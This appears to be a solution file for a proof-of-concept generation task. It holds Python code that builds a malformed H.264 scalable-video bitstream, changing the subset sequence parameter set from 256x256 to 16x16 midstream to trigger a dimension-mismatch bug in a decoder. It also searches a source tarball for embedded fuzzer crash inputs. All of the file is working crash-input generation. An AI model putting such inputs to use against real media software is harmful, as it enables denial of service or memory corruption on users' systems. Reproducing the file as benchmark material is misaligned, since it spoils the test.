import os
import re
import tarfile
from dataclasses import dataclass
from typing import Optional, Tuple


class _BitWriter:
    __slots__ = ("_buf", "_cur", "_nbits")

    def __init__(self) -> None:
        self._buf = bytearray()
        self._cur = 0
        self._nbits = 0

    def write_bits(self, v: int, n: int) -> None:
        if n <= 0:
            return
        v &= (1 << n) - 1
        while n > 0:
            take = min(8 - self._nbits, n)
            shift = n - take
            bits = (v >> shift) & ((1 << take) - 1)
            self._cur = (self._cur << take) | bits
            self._nbits += take
            n -= take
            if self._nbits == 8:
                self._buf.append(self._cur & 0xFF)
                self._cur = 0
                self._nbits = 0

    def write_bit(self, b: int) -> None:
        self.write_bits(1 if b else 0, 1)

    def write_ue(self, k: int) -> None:
        if k < 0:
            k = 0
        code_num = k + 1
        bl = code_num.bit_length()
        leading_zeros = bl - 1
        if leading_zeros:
            self.write_bits(0, leading_zeros)
        self.write_bits(code_num, bl)

    def write_se(self, v: int) -> None:
        if v <= 0:
            code_num = -2 * v
        else:
            code_num = 2 * v - 1
        self.write_ue(code_num)

    def byte_align_zero(self) -> None:
        if self._nbits:
            self.write_bits(0, 8 - self._nbits)

    def rbsp_trailing_bits(self) -> None:
        self.write_bit(1)
        self.byte_align_zero()

    def finish(self) -> bytes:
        if self._nbits:
            self._cur <<= (8 - self._nbits)
            self._buf.append(self._cur & 0xFF)
            self._cur = 0
            self._nbits = 0
        return bytes(self._buf)


def _rbsp_to_ebsp(rbsp: bytes) -> bytes:
    out = bytearray()
    zeros = 0
    for b in rbsp:
        if zeros >= 2 and b <= 3:
            out.append(3)
            zeros = 0
        out.append(b)
        if b == 0:
            zeros += 1
        else:
            zeros = 0
    return bytes(out)


def _make_nal(nal_unit_type: int, rbsp: bytes, nal_ref_idc: int = 3, long_start_code: bool = True) -> bytes:
    hdr = ((nal_ref_idc & 3) << 5) | (nal_unit_type & 0x1F)
    start = b"\x00\x00\x00\x01" if long_start_code else b"\x00\x00\x01"
    return start + bytes([hdr]) + _rbsp_to_ebsp(rbsp)


def _build_sps_rbsp(profile_idc: int, level_idc: int, sps_id: int, width_mbs: int, height_mbs: int) -> bytes:
    bw = _BitWriter()
    bw.write_bits(profile_idc & 0xFF, 8)
    bw.write_bits(0, 8)  # constraint flags + reserved
    bw.write_bits(level_idc & 0xFF, 8)
    bw.write_ue(sps_id)

    # For profiles including scalable baseline/high, the "high profile" fields are present.
    if profile_idc in (100, 110, 122, 244, 44, 83, 86, 118, 128, 138, 139, 134, 135):
        bw.write_ue(1)  # chroma_format_idc (4:2:0)
        bw.write_ue(0)  # bit_depth_luma_minus8
        bw.write_ue(0)  # bit_depth_chroma_minus8
        bw.write_bit(0)  # qpprime_y_zero_transform_bypass_flag
        bw.write_bit(0)  # seq_scaling_matrix_present_flag

    bw.write_ue(0)  # log2_max_frame_num_minus4 (=> 4 bits)
    bw.write_ue(0)  # pic_order_cnt_type
    bw.write_ue(0)  # log2_max_pic_order_cnt_lsb_minus4 (=> 4 bits)
    bw.write_ue(1)  # max_num_ref_frames
    bw.write_bit(0)  # gaps_in_frame_num_value_allowed_flag
    bw.write_ue(max(0, width_mbs - 1))
    bw.write_ue(max(0, height_mbs - 1))
    bw.write_bit(1)  # frame_mbs_only_flag
    bw.write_bit(1)  # direct_8x8_inference_flag
    bw.write_bit(0)  # frame_cropping_flag
    bw.write_bit(0)  # vui_parameters_present_flag
    bw.rbsp_trailing_bits()
    return bw.finish()


def _build_subset_sps_rbsp(profile_idc: int, level_idc: int, sps_id: int, width_mbs: int, height_mbs: int) -> bytes:
    bw = _BitWriter()
    bw.write_bits(profile_idc & 0xFF, 8)
    bw.write_bits(0, 8)  # constraint flags + reserved
    bw.write_bits(level_idc & 0xFF, 8)
    bw.write_ue(sps_id)

    chroma_format_idc = 1
    if profile_idc in (100, 110, 122, 244, 44, 83, 86, 118, 128, 138, 139, 134, 135):
        bw.write_ue(chroma_format_idc)
        bw.write_ue(0)  # bit_depth_luma_minus8
        bw.write_ue(0)  # bit_depth_chroma_minus8
        bw.write_bit(0)  # qpprime_y_zero_transform_bypass_flag
        bw.write_bit(0)  # seq_scaling_matrix_present_flag

    bw.write_ue(0)  # log2_max_frame_num_minus4
    bw.write_ue(0)  # pic_order_cnt_type
    bw.write_ue(0)  # log2_max_pic_order_cnt_lsb_minus4
    bw.write_ue(1)  # max_num_ref_frames
    bw.write_bit(0)  # gaps_in_frame_num_value_allowed_flag
    bw.write_ue(max(0, width_mbs - 1))
    bw.write_ue(max(0, height_mbs - 1))
    bw.write_bit(1)  # frame_mbs_only_flag
    bw.write_bit(1)  # direct_8x8_inference_flag
    bw.write_bit(0)  # frame_cropping_flag
    bw.write_bit(0)  # vui_parameters_present_flag (in seq_parameter_set_data)

    # SVC extension for scalable profiles (Annex G)
    if profile_idc in (83, 86):
        bw.write_bit(0)  # inter_layer_deblocking_filter_control_present_flag
        bw.write_bits(0, 2)  # extended_spatial_scalability_idc
        # chroma phase fields (for chroma_format_idc 1 or 2)
        bw.write_bit(0)  # chroma_phase_x_plus1_flag
        bw.write_bits(0, 2)  # chroma_phase_y_plus1
        bw.write_bit(0)  # seq_tcoeff_level_prediction_flag
        bw.write_bit(0)  # slice_header_restriction_flag
        bw.write_bit(0)  # svc_vui_parameters_present_flag

    bw.write_bit(0)  # additional_extension2_flag
    bw.rbsp_trailing_bits()
    return bw.finish()


def _build_pps_rbsp(pps_id: int, sps_id: int) -> bytes:
    bw = _BitWriter()
    bw.write_ue(pps_id)
    bw.write_ue(sps_id)
    bw.write_bit(0)  # entropy_coding_mode_flag (CAVLC)
    bw.write_bit(0)  # bottom_field_pic_order_in_frame_present_flag
    bw.write_ue(0)  # num_slice_groups_minus1
    bw.write_ue(0)  # num_ref_idx_l0_default_active_minus1
    bw.write_ue(0)  # num_ref_idx_l1_default_active_minus1
    bw.write_bit(0)  # weighted_pred_flag
    bw.write_bits(0, 2)  # weighted_bipred_idc
    bw.write_se(0)  # pic_init_qp_minus26
    bw.write_se(0)  # pic_init_qs_minus26
    bw.write_se(0)  # chroma_qp_index_offset
    bw.write_bit(1)  # deblocking_filter_control_present_flag
    bw.write_bit(0)  # constrained_intra_pred_flag
    bw.write_bit(0)  # redundant_pic_cnt_present_flag
    bw.rbsp_trailing_bits()
    return bw.finish()


def _build_aud_rbsp(primary_pic_type: int = 0) -> bytes:
    bw = _BitWriter()
    bw.write_bits(primary_pic_type & 7, 3)
    bw.rbsp_trailing_bits()
    return bw.finish()


def _build_idr_slice_rbsp(frame_num: int, poc_lsb: int, pps_id: int, num_mbs: int) -> bytes:
    bw = _BitWriter()
    bw.write_ue(0)  # first_mb_in_slice
    bw.write_ue(2)  # slice_type = I
    bw.write_ue(pps_id)
    bw.write_bits(frame_num & 0xF, 4)  # frame_num (log2_max_frame_num_minus4=0)
    bw.write_ue(0)  # idr_pic_id
    bw.write_bits(poc_lsb & 0xF, 4)  # pic_order_cnt_lsb (log2_max_pic_order_cnt_lsb_minus4=0)
    # dec_ref_pic_marking (IDR)
    bw.write_bit(0)  # no_output_of_prior_pics_flag
    bw.write_bit(0)  # long_term_reference_flag
    bw.write_se(0)  # slice_qp_delta
    bw.write_ue(0)  # disable_deblocking_filter_idc
    bw.write_se(0)  # slice_alpha_c0_offset_div2
    bw.write_se(0)  # slice_beta_offset_div2

    # Macroblocks: I_PCM
    pcm = b"\x00" * (256 + 64 + 64)  # 8-bit 4:2:0
    for _ in range(max(1, num_mbs)):
        bw.write_ue(25)  # I_PCM mb_type in I-slice
        bw.byte_align_zero()  # pcm_alignment_zero_bit
        for b in pcm:
            bw.write_bits(b, 8)

    bw.rbsp_trailing_bits()
    return bw.finish()


def _gen_poc_h264_svc_mismatch() -> bytes:
    # Create mismatch between "display" dimensions (from an earlier SPS/SUBSET SPS)
    # and later subset sequence dimensions by changing subset SPS midstream.
    profile_idc = 83  # scalable baseline
    level_idc = 10
    sps_id = 0
    pps_id = 0

    # Large "display" dimensions: 256x256 => 16x16 MBs
    sps_large = _build_sps_rbsp(profile_idc, level_idc, sps_id, 16, 16)
    subset_large = _build_subset_sps_rbsp(profile_idc, level_idc, sps_id, 16, 16)

    # Small subset dimensions: 16x16 => 1x1 MB
    subset_small = _build_subset_sps_rbsp(profile_idc, level_idc, sps_id, 1, 1)

    pps = _build_pps_rbsp(pps_id, sps_id)
    aud = _build_aud_rbsp(0)

    slice_small = _build_idr_slice_rbsp(frame_num=0, poc_lsb=0, pps_id=pps_id, num_mbs=1)

    stream = bytearray()
    stream += _make_nal(7, sps_large, nal_ref_idc=3)
    stream += _make_nal(15, subset_large, nal_ref_idc=3)
    stream += _make_nal(15, subset_small, nal_ref_idc=3)
    stream += _make_nal(8, pps, nal_ref_idc=3)
    stream += _make_nal(9, aud, nal_ref_idc=0)
    stream += _make_nal(5, slice_small, nal_ref_idc=3)
    return bytes(stream)


def _looks_like_h264_annexb(data: bytes) -> int:
    if len(data) < 64:
        return 0
    score = 0
    if b"\x00\x00\x00\x01" in data or b"\x00\x00\x01" in data:
        score += 10
    if b"\x00\x00\x00\x01\x6f" in data or b"\x00\x00\x01\x6f" in data:
        score += 50  # subset SPS header
    if b"\x00\x00\x00\x01\x67" in data or b"\x00\x00\x01\x67" in data:
        score += 10
    if b"\x00\x00\x00\x01\x65" in data or b"\x00\x00\x01\x65" in data:
        score += 10
    return score


def _select_embedded_poc_from_tar(src_path: str) -> Optional[bytes]:
    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return None

    best: Tuple[int, Optional[bytes]] = (0, None)
    target_len = 6180

    try:
        members = tf.getmembers()
        for m in members:
            if not m.isreg():
                continue
            if m.size < 64 or m.size > 200000:
                continue
            name = m.name.lower()
            name_score = 0
            if any(k in name for k in ("clusterfuzz", "crash", "poc", "repro", "oss-fuzz")):
                name_score += 100
            if any(name.endswith(ext) for ext in (".264", ".h264", ".avc", ".svc", ".bin", ".dat", ".raw")):
                name_score += 40
            if "test" in name or "corpus" in name or "fuzz" in name:
                name_score += 10

            if name_score == 0 and m.size > 20000:
                continue

            f = tf.extractfile(m)
            if f is None:
                continue
            try:
                data = f.read()
            except Exception:
                continue

            fmt_score = _looks_like_h264_annexb(data)
            if fmt_score == 0 and name_score < 100:
                continue

            size_bonus = max(0, 40 - (abs(len(data) - target_len) // 200))
            total = name_score + fmt_score + size_bonus
            if total > best[0]:
                best = (total, data)
    finally:
        try:
            tf.close()
        except Exception:
            pass

    return best[1]


class Solution:
    def solve(self, src_path: str) -> bytes:
        data = None
        if isinstance(src_path, str) and os.path.exists(src_path) and os.path.isfile(src_path):
            data = _select_embedded_poc_from_tar(src_path)
        if data is not None:
            return data
        return _gen_poc_h264_svc_mismatch()